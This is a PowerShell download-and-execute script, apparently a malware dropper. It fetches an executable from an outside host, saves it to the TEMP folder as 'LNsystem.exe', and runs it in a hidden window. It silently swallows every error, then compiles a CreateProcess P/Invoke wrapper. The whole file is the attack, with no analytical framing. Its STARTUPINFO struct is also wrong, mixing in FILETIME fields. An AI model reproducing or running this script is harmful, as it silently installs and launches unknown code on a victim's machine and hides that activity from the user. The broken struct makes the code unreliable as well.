# Download and execute an executable file from a specified URL
$url = "http://a1067277.xsph.ru/1Elusion.exe";
$outputPath = "$env:TEMP\\LNsystem.exe" # Change this to your desired path

try {{
    # Download the executable file
    Invoke-RestMethod -Uri $url -OutFile $outputPath

    # Run the downloaded executable in a hidden window
    Start-Process -FilePath $outputPath -WindowStyle Hidden
}} catch {{
    # Suppressing errors, nothing will be output to the console
}}

# Optional: If you want to define a Windows API function for future use
$addTypeDefinition = @"
using System;
using System.Runtime.InteropServices;

public class ProcessHelper {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {{
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public int dwHighDateTime;
        public int dwLowDateTime;
    }}

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }}
}}
"@;

# Compile the type definition
Add-Type -TypeDefinition $addTypeDefinition -Language CSharp
